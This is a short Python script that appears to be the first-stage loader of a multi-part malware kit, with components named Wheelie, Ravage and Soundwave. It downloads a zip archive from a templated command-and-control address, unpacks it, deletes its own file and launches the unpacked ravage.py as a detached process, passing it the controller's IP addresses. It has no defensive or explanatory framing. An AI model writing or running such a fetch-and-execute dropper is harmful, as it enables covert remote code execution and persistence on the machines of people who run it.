import random
import string
from urllib import request
import os
import subprocess


def get_random_string(length):
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for _ in range(length))
    return result_str


WHEELIE_PATH = os.path.abspath(__file__)
# RAVAGE_DIR = f'/tmp/{get_random_string(20)}'
RAVAGE_DIR = os.path.realpath('/home/sam/Desktop/ravage-tmp')
SOUNDWAVE_IP = '<>SOUNDWAVE_IP</>'
RAVAGE_IP = '<>RAVAGE_IP</>'
WEB_SERVER_PORT = '<>WEB_SERVER_PORT</>'


with request.urlopen(f'http://{SOUNDWAVE_IP}:{WEB_SERVER_PORT}/ravage') as res:
    data = res.read()

os.makedirs(RAVAGE_DIR, exist_ok=True)
with open(f'{RAVAGE_DIR}/ravage.zip', 'wb') as fh:
    fh.write(data)

os.system(f'unzip -o -q {RAVAGE_DIR}/ravage.zip -d {RAVAGE_DIR}/')
os.system(f'rm -rf {WHEELIE_PATH}')

subprocess.Popen(['python3', f'{RAVAGE_DIR}/ravage.py', SOUNDWAVE_IP, RAVAGE_IP],
                 cwd=RAVAGE_DIR, start_new_session=True)
